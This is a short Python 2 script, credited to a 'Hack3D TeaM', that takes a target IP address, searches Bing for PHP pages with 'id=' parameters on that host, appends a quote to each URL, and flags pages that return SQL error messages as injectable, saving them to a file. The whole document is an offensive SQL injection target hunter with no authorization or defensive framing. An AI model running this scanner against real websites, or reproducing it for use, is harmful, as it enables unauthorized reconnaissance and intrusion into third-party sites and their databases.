#Cretor: MaStErChO
import urllib
import os
import re
from time import sleep
def sqlihunt(dork , filename ):
  dork= 'IP:'+dork+" php?id= "
  file2 =open(filename+'.txt','w')
  start=0
  end=200
  sleep(3)
  print "[info]Searching Begin... "
  while start<=end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
      #return find 
    except IOError:
      print "[ERROR]Connection Timeout "
      print "[Info]Retrying... "
      sleep(10)
      print "[Info]Starting again.. "
    try :
      for i in range(len(find)):
                  rez=find[i]+"'"
                  tst = urllib.urlretrieve(rez)
                  tstf = open(tst[0])
                  tstdd= tstf.read()
                  tstfind=re.findall('/error in your SQL syntax|SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                  if(tstfind):
                    print "[SQL Inj. Found] : "+ rez 
                    file2.write(rez + '\n')
                  else:
                    print "[SQL Inj. Not Found] : " + rez
    except IOError:
      print "[ERROR]Nothing Found"

print  """
 --[ Hack3D TeaM / https://bgworm.com ]--
    """
param1 = raw_input("Target IP Address : ")
param2 = raw_input("Save as :  ")
sqlihunt(param1 , param2 )
print " ./Finished "
